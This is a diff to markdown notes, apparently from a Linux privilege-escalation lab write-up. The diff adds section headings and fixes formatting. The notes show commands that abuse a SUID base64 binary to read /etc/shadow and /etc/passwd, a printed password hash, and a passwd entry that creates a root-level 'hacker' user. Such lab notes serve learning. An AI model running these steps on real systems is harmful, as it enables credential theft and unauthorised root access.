@@ -311,13 +311,12 @@ LFILE=file_to_read
 
 ## Read /etc/shadow file
 * `find / -type f -perm -04000 -ls 2>/dev/null`.
-  * `base64` has SUID bit set.
+  * `/usr/bin/base64` has SUID bit set.
 ```
 $ LFILE=/etc/shadow
 $ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
 ```
 * Prints contents of the `/etc/shadow` file.
-```
 ```
 user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
 ```
@@ -326,7 +325,6 @@ $ LFILE=/etc/passwd
 $ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
 ```
 * Prints contents of the `/etc/passwd` file.
-```
 ```
 user2:x:1002:1002::/home/user2:/bin/sh
 ```
@@ -339,7 +337,6 @@ mkdir ./Desktop/SUID
 touch ./Desktop/SUID/passwd.txt
 ```
   * Copy **user2** data from `/etc/passwd' into `passwd.txt` file.
-```
 ```
 touch ./Desktop/SUID/passwords.txt
 ```
@@ -381,3 +378,10 @@ $1$THM$WnbwlliCqxFRQepUTCkUT1
 hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
 ``` 
 * Switch to the new user and hopefully gain root privileges. 
+
+## Privilege Escalation: Capabilities
+
+## Privilege Escalation: Cron Jobs
+## Privilege Escalation: PATH
+## Privilege Escalation: NFS
+## Capstone Challenge
